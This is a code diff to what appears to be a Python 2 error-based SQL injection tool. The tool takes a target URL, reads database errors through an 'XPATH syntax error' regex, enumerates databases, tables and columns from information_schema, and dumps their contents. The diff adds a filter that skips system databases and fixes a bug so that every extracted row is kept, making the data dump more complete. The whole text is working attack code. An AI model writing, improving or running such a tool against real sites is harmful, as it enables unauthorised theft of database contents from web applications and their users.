@@ -10,6 +10,7 @@ __author__ = 'Excelle Su'
 from urllib2 import urlopen
 from sys import argv
 from adv_dict import Dict
+from ignored import isIgnorable
 import re, hashlib, time
 
 _RE_DATA = re.compile(r'XPATH syntax error: \':([\w\s]+)\'')
@@ -69,6 +70,10 @@ def get_columns_names(target_url):
                 break
         else:
             break
+        # Skip system databases
+        if isIgnorable(db_name):
+            continue
+
         column.database = db_name + '.' + table_name
         column.name = retrieve_data(make_payload(target_url, 'column_name', 'information_schema.columns', offset))
         col_names.append(column)
@@ -79,11 +84,11 @@ def get_columns_data(target_url):
     global col_names
     for col in col_names:
         offset = 0
+        col.content = []
         print('Get data: ' + col.database + ' => ' + col.name)
         while True:
             row = retrieve_data(make_payload(target_url, col.name, col.database, offset))
             if row and row != 'ERROR':
-                col.content = []
                 col.content.append(row)
             else:
                 break
